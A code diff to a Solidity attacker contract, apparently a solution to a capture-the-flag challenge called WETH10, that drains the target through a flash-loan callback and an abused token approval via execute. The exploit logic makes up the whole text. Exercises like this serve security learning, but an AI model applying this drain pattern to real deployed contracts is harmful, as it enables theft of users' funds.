@@ -12,6 +12,12 @@ interface IChallenge {
 
     function approve(address spender, uint256 amount) external;
 
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external returns (bool);
+
     function deposit() external payable;
 }
 
@@ -29,18 +35,25 @@ contract Bob {
     }
 
     function deposit() external payable {
-        balance[msg.sender] = 1 ether;
+        balance[msg.sender] = msg.value;
     }
 
+    //called by th WETH10
     function loan(uint256 amount) external payable {
         challenge.approve(address(challenge), type(uint256).max);
         // bob.transfer(1 ether);
+        challenge.transferFrom(
+            address(this),
+            address(challenge),
+            address(this).balance
+        );
         emit Ammount(amount);
-        selfdestruct(payable(challengeaddress));
     }
 
     function attack() external payable {
-        uint256 amount = 1 ether;
+        // uint256 amount = 1 ether;
+        uint256 amount = 0;
+        challenge.deposit{value: address(this).balance}();
 
         bytes memory data1 = abi.encodeWithSignature("loan(uint256)", amount);
 
@@ -48,7 +61,6 @@ contract Bob {
     }
 
     function attack2() external payable {
-        // we approve all the token balance of contract WETH10 to bobs address
         bytes memory data = abi.encodeWithSignature(
             "approve(address,uint256)",
             address(0),
@@ -57,6 +69,8 @@ contract Bob {
 
         challenge.execute(address(challenge), 0, data);
     }
+
+    receive() external payable {}
 }
 
 // contract Attacker {
